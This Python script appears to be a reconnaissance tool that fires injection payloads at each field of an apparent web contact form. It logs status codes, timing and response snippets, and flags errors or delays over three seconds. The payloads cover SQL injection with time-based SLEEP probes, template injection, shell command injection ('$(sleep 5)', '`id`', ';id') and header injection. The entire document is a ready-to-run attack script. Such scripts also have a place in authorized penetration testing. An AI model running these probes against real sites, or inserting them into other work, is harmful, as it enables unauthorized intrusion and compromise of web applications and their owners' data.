import sys, json, time
sys.path.insert(0,'AT')
from p1_inj import send, base_fields

SQLI = ["'","\"","' OR '1'='1","' AND '1'='2","1' ORDER BY 1--","1;SELECT 1--",
        "1 AND SLEEP(5)","1' AND (SELECT SLEEP(5))--","${7*7}","{{7*7}}","<%= 7*7 %>",
        "$(sleep 5)","`id`",";id","||id","%0aid","\nX-Inj: 1"]
FIELDS = ["fname","lname","cname","subject","msg","areacode","tel"]

for fld in FIELDS:
    for p in SQLI:
        f = base_fields(); f[fld] = p
        st, body, dt = send(f)
        flag = ""
        if st in (500,502,503) or "sqlmap" in body.lower(): flag=" <<<"
        if dt > 3.0: flag += " SLOW"
        print(f"{fld:9s} {p[:26]!r:30s} -> {st} {dt:.2f}s {body[:130]}{flag}")
        time.sleep(0.4)
